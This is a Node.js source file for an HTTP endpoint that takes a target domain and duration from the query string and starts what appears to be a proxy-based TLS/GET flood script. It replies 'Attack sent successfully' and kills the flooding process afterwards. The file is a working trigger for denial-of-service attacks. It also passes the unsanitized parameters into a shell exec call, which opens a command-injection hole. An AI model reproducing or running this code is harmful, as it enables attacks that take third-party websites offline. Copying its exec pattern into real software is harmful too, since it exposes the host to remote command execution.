const http = require('http');
const url = require('url');
const { exec } = require('child_process');

const server = http.createServer((req, res) => {
  const query = url.parse(req.url, true).query;
  const domain = query.domain;
  const time = query.time;
  if(!domain || !time){
    res.end("Please specify a domain and time");
    return;
  }
  exec(`node index.js ${domain} ${time} TLSv2 100 15 GET 4 false proxy.txt 100`, (error, stdout, stderr) => {
    if (error) {
      console.error(`exec error: ${error}`);
      return;
    }
    setTimeout(()=>{
    exec("pkill fixedtls",(err,stdout,stderr)=>{
      if(err){
        console.log("error while running pkill command")
      }
    })
    },(parseInt(time)+5)*1000);
    res.end('Attack sent successfully.');
  });
});

server.listen(8000);
